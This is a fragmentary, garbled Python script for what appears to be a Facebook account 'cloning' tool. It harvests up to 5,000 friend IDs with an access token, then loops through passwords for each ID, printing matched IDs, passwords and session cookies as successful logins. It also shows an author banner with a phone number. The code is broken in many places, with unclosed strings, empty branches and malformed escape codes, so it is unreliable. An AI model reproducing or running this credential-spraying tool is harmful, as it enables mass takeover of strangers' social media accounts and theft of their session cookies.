...
princp=[]
try:
	prox= requests.get(https://github.com/Bayezid-400Api/blob/main/prox.txt').text
...
def uaku():
	try:
		...
		a=requests.get(' https://github.com/Bayezid-400/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
os.system('espeak -a 300 " Welcome,   to,  Bayezid-400   Tools"')
os.system('xdg-open https://www.facebook.com/BAYEZID.Ok.Bro')
def banner():
	os.system("clear")
	print (f""
\033[0;80  ####            ### ##            ### ###            ## ##   
...
\033[0;80m╚━━━━━━━━━━━━━━━━━━━━━━━"━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;80m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY MOBILE WIFi And data working  ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Bayszid]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Md Bayezid Isalam   ║  \023[1;97m  
╠══[Github                   • \33[1;38m Bayezid-400  ]   ║\33[1;34m   
╠══[Whatsapp                 • 01326226582 ]  ║\23[1;35m?  
╠══[TOOLS                    • Free  ]        ║ \33[1;32m   
╠══[VERSION                  • 1.00 ]          ║\023[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	BAYEZID('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	BAYEZID('\033[0;97m===============================================')
	BAYEZID= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if BAYEZID in ['m']:
		public()
	elif BAYEZID in ['1']:
		crack_file()
	elif BAYEZID in ['i','0i']:
		result()
	elif BAYEZID  in ['2','02']:
	elif BAYEZID in ['0']:
...
def public():
	...
	for userr in uid:
		try:
			col = ses.get('?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			...
			os.system('clear')
	try:
		print(f' [] I D F C ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/Bayezid.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Bayezid-400 ] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#BAYEZID
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Bayezid-Cp] {idf} • {pw}')     
				...
				#BAYEZID
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•I D F C-Ok💚] {idf} • {pw}\n\033[0;93m[🙂]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Bayezid,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Bayezid-400/Public-CloNing-400
	if key1 in r1:
		os.system('clear')
		login()
	else:
